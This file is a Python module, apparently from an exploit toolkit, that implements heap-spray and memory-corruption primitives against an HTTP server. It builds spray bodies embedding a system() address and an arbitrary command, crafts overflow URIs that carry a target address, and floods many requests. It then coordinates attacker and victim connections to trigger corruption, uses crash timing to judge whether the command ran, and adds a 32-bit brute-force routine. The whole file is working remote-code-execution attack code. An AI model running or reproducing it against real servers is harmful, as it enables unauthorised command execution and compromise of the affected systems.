"""
core/spray.py — Heap-spray primitives.
Covers: build_spray_body, build_overflow_uri, spray_bodies,
        attempt_corruption, attempt_32, server_alive, wait_alive,
        addr_safe_in_uri, addr_to_uri_bytes, wrap_if_ssl
"""
from __future__ import annotations

import socket
import ssl
import struct
import time

from config import (
    BODY_LEN, N_SPRAY, PAD_A, PAD_PLUS, DATA_ADDR_OFFSET, SAFE_URI_BYTES,
    DEFAULT_N_PLUS_32,
)


# ─── URI-byte helpers ─────────────────────────────────────────────────────────

def addr_safe_in_uri(addr: int, n_bytes: int = 6) -> bool:
    return all(((addr >> (j * 8)) & 0xff) in SAFE_URI_BYTES for j in range(n_bytes))


def addr_to_uri_bytes(addr: int, n_bytes: int = 6) -> bytes:
    return bytes((addr >> (j * 8)) & 0xff for j in range(n_bytes))


# ─── SSL helper ───────────────────────────────────────────────────────────────

def wrap_if_ssl(sock: socket.socket, host: str, use_ssl: bool) -> socket.socket:
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(sock, server_hostname=host)
    return sock


# ─── Liveness helpers ─────────────────────────────────────────────────────────

def server_alive(host: str, port: int, timeout: float = 2.0,
                 vhost: str = "l", use_ssl: bool = False) -> bool:
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            s.sendall(f"GET / HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode())
            data = s.recv(64)
            return bool(data) and data.startswith(b"HTTP/1.")
    except OSError:
        return False


def wait_alive(host: str, port: int, timeout: float = 30.0,
               vhost: str = "l", use_ssl: bool = False) -> bool:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if server_alive(host, port, timeout=1.0, vhost=vhost, use_ssl=use_ssl):
            return True
        time.sleep(0.5)
    return False


# ─── Core spray functions ─────────────────────────────────────────────────────

def build_spray_body(cmd: str, data_addr: int, system_addr: int) -> bytes:
    fake = struct.pack("<QQQ", system_addr, data_addr, 0)
    cmd_bytes = cmd.encode("utf-8") + b"\x00"
    payload = fake + cmd_bytes
    if len(payload) > BODY_LEN:
        raise ValueError(f"command too long ({len(payload)} > {BODY_LEN})")
    return payload + b"\x41" * (BODY_LEN - len(payload))


def build_overflow_uri(target_addr: int, pad_a: int = PAD_A,
                       pad_plus: int = PAD_PLUS) -> bytes:
    return (b"A" * pad_a) + (b"+" * pad_plus) + addr_to_uri_bytes(target_addr)


def spray_bodies(host: str, port: int, body: bytes,
                 n: int = N_SPRAY, vhost: str = "l", use_ssl: bool = False,
                 spray_path: str = "/spray") -> list[socket.socket]:
    sprays: list[socket.socket] = []
    for _ in range(n):
        try:
            sock = socket.create_connection((host, port), timeout=5)
            s = wrap_if_ssl(sock, host, use_ssl)
            req = (
                f"POST {spray_path} HTTP/1.1\r\n".encode() +
                b"Host: " + vhost.encode() + b"\r\n"
                b"Content-Length: " + str(BODY_LEN).encode() + b"\r\n"
                b"X-Delay: 60\r\n"
                b"Connection: close\r\n\r\n" + body
            )
            s.sendall(req)
            sprays.append(s)
            time.sleep(0.005)
        except OSError:
            break
    return sprays


def attempt_corruption(host: str, port: int, uri: bytes,
                       vhost: str = "localhost",
                       use_ssl: bool = False) -> tuple[bool, float]:
    """Returns (crashed, crash_latency_ms).

    Latency <10ms suggests malloc-abort (no RCE); >100ms suggests system() ran.
    """
    try:
        attacker_sock = socket.create_connection((host, port), timeout=5)
        attacker = wrap_if_ssl(attacker_sock, host, use_ssl)
        time.sleep(0.02)
        victim_sock = socket.create_connection((host, port), timeout=5)
        victim = wrap_if_ssl(victim_sock, host, use_ssl)
        time.sleep(0.02)
    except OSError:
        return False, 0.0

    try:
        attacker.sendall(
            b"GET /api/" + uri + b" HTTP/1.1\r\n"
            b"Host:" + vhost.encode() + b"\r\n"
        )
        time.sleep(0.05)
        victim.sendall(b"GET / HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\n")
        time.sleep(0.05)
        attacker.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
        t_start = time.monotonic()
        time.sleep(0.2)
        victim.close()
        time.sleep(0.1)

        try:
            attacker.sendall(b"X-Ping:1\r\n")
            attacker.settimeout(0.2)
            data = attacker.recv(1)
            if not data:
                return True, (time.monotonic() - t_start) * 1000
        except socket.timeout:
            try:
                check_sock = socket.create_connection((host, port), timeout=0.2)
                with wrap_if_ssl(check_sock, host, use_ssl) as s2:
                    s2.sendall(
                        f"GET / HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode()
                    )
                    if not s2.recv(10):
                        return True, (time.monotonic() - t_start) * 1000
            except OSError:
                return True, (time.monotonic() - t_start) * 1000
            return False, 0.0
        except (ConnectionResetError, BrokenPipeError, OSError):
            return True, (time.monotonic() - t_start) * 1000
        return False, 0.0
    finally:
        try:
            attacker.close()
        except OSError:
            pass


def attempt_32(host: str, port: int, body: bytes, spray_addr: int,
               n_plus: int = DEFAULT_N_PLUS_32,
               vhost: str = "l", use_ssl: bool = False,
               spray_path: str = "/spray") -> bool:
    """32-bit brute-force attempt (dinosn style)."""
    try:
        spray_sock = socket.create_connection((host, port), timeout=0.3)
        spray = wrap_if_ssl(spray_sock, host, use_ssl)
        spray.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        spray.sendall(
            f"POST {spray_path} HTTP/1.1\r\n".encode() +
            b"Host:" + vhost.encode() + b"\r\n"
            b"Content-Length:" + str(BODY_LEN).encode() + b"\r\n"
            b"X-Delay:30\r\n"
            b"Connection:close\r\n\r\n" + body
        )
    except OSError:
        return False

    time.sleep(0.005)
    target_bytes = struct.pack("<I", spray_addr)

    try:
        attacker_sock = socket.create_connection((host, port), timeout=0.3)
        attacker = wrap_if_ssl(attacker_sock, host, use_ssl)
        attacker.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        uri = b"A" + b"+" * n_plus + target_bytes
        attacker.sendall(b"GET /api/" + uri + b" HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\n")
    except OSError:
        try:
            spray.close()
        except Exception:
            pass
        return False

    time.sleep(0.003)
    try:
        victim_sock = socket.create_connection((host, port), timeout=0.3)
        victim = wrap_if_ssl(victim_sock, host, use_ssl)
        victim.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        victim.sendall(b"GET / HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\n")
    except OSError:
        try:
            attacker.close()
        except Exception:
            pass
        try:
            spray.close()
        except Exception:
            pass
        return False

    time.sleep(0.003)
    try:
        attacker.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
    except OSError:
        pass

    time.sleep(0.003)
    for s in (victim, attacker, spray):
        try:
            s.close()
        except Exception:
            pass
    return True
